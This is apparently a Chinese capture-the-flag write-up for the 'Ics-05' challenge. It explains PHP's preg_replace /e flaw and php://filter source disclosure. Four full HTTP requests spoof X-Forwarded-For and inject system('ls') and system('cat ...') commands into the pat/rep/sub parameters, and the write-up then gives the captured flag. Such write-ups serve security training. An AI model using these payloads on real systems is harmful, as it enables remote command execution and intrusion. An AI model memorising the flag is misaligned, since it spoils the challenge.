# Ics-05

> 题目提示其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统,说明网站已被入侵

## 涉及函数

### preg_replace

> mixed preg_replace(mixed $pattern, mixed $replacement, mixed $subject[, int $limit = -1 [, int &$count]]),搜索subject中匹配pattern的部分,以 replacement进行替换

> preg_replace()函数存在一个安全问题,/e修正符使preg_replace()将replacement参数当作PHP代码去执行(在适当的逆向引用替换完之后).提示:要确保replacement构成一个合法的PHP代码字符串,否则PHP会在报告在包含preg_replace()的行中出现语法解析错误.

## PHP文件包含漏洞常用伪协议

```
file:// 访问本地文件系统
http:// 访问http(s）网址
ftp:// 访问ftp
php:// 访问各个输入/输出流
zlib:// 压缩流
data:// 数据
rar:// RAR压缩包
ogg:// 音频流
```

## filters类型

> String Filters: string.rot13、string.toupper、string.tolower、string.strip_tags

> Conversion Filters: convert.base64-encode & convert.base64-decode、convert.quoted-printable-encode & convert.quoted-printable-decode、convert.iconv.*

> Compression Filters: zlib.deflate、zlib.inflate、bzip2.compress和bzip2.decompress

> Encryption Filters: mcrypt.*和 mdecrypt.*

> [官方文档]https://www.php.net/manual/zh/filters.php

> [使用参考](https://blog.csdn.net/qq_44657899/article/details/109300335)

## filters支持编码

```
UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
EUC-JP*
SJIS*
eucJP-win*
SJIS-win*
...
```

> [官方文档](https://www.php.net/manual/zh/mbstring.supported-encodings.php)

## 思路分析

> 题目提示其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统,说明网站已被入侵,要想得到flag,需要读取出文件找出后门,可用伪协议php://读取文件,php://filter/read=convert.base64-encode/resource=index.php,得到的结果base64解码得到源码.从源码中可以看到,首先要设置X-Forwarded-For为127.0.0.1才能继续下去触发后门,要传入pat、rep、sub这三个参数.然后就利用preg_replace的弱点去执行命令

## payload

```
GET /index.php?pat=/test/e&rep=system("ls")&sub=test HTTP/1.1
Host: 61.147.171.105:50196
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8350ed146782d59d3f54a51262755aa4
X-Forwarded-For: 127.0.0.1
Connection: close
```

```
GET /index.php?pat=/test/e&rep=system("ls+s3chahahaDir")&sub=test HTTP/1.1
Host: 61.147.171.105:50196
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8350ed146782d59d3f54a51262755aa4
X-Forwarded-For: 127.0.0.1
Connection: close
```

```
GET /index.php?pat=/test/e&rep=system("ls+s3chahahaDir/flag")&sub=test HTTP/1.1
Host: 61.147.171.105:50196
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8350ed146782d59d3f54a51262755aa4
X-Forwarded-For: 127.0.0.1
Connection: close
```

```
GET /index.php?pat=/test/e&rep=system("cat+s3chahahaDir/flag/flag.php")&sub=test HTTP/1.1
Host: 61.147.171.105:50196
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8350ed146782d59d3f54a51262755aa4
X-Forwarded-For: 127.0.0.1
Connection: close
```

## flag

> cyberpeace{80e1826881bdb54473f822560d1866b3}